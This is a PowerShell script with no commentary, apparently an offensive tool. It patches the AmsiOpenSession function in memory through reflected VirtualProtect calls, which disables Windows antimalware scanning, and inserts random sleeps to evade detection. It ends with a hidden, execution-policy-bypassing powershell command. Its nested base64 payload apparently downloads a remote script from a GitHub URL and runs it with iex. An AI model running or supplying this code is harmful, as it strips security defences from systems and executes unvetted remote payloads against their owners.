$magic1 = Get-Random -Minimum 1000 -Maximum 5000
$magic2 = Get-Random -Minimum 1000 -Maximum 5000
$magic3 = Get-Random -Minimum 1000 -Maximum 5000
$magic4 = Get-Random -Minimum 1000 -Maximum 5000
$magic5 = Get-Random -Minimum 1000 -Maximum 5000
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}
[System.Threading.Thread]::Sleep($magic1)

function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

[System.Threading.Thread]::Sleep($magic2)

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
[System.Threading.Thread]::Sleep($magic3)
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
[System.Threading.Thread]::Sleep($magic4)
$buf = [Byte[]] (0x48,0x31,0xc9)
[System.Threading.Thread]::Sleep($magic5)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

powershell.exe -ep bypass -nop -windowstyle hidden -encodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHAAIABiAHkAcABhAHMAcwAgAC0AbgBvAHAAIAAtAHcAaQBuAGQAbwB3AHMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuACAALQBlAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABTAFEAQgB1AEEASABZAEEAYgB3AEIAcgBBAEcAVQBBAEwAUQBCAFMAQQBHAFUAQQBjAHcAQgAwAEEARQAwAEEAWgBRAEIAMABBAEcAZwBBAGIAdwBCAGsAQQBDAEEAQQBMAFEAQgBWAEEASABJAEEAYQBRAEEAZwBBAEcAZwBBAGQAQQBCADAAQQBIAEEAQQBjAHcAQQA2AEEAQwA4AEEATAB3AEIAeQBBAEcARQBBAGQAdwBBAHUAQQBHAGMAQQBhAFEAQgAwAEEARwBnAEEAZABRAEIAaQBBAEgAVQBBAGMAdwBCAGwAQQBIAEkAQQBZAHcAQgB2AEEARwA0AEEAZABBAEIAbABBAEcANABBAGQAQQBBAHUAQQBHAE0AQQBiAHcAQgB0AEEAQwA4AEEAYQBnAEIAaABBAEcAMABBAFkAdwBBAHQAQQBHAE0AQQBiAHcAQgB1AEEASABRAEEAYwBnAEIAaABBAEcATQBBAGQAQQBCAHYAQQBIAEkAQQBMAHcAQgB3AEEASABJAEEAZABRAEIAbABBAEcASQBBAFkAUQBBAHYAQQBHADAAQQBZAFEAQgBwAEEARwA0AEEATAB3AEIAaABBAEcAUQBBAFoAQQBCAHYAQQBHADQAQQBMAGcAQgB3AEEASABNAEEATQBRAEEAZwBBAEgAdwBBAEkAQQBCAHAAQQBHAFUAQQBlAEEAQQA9AA==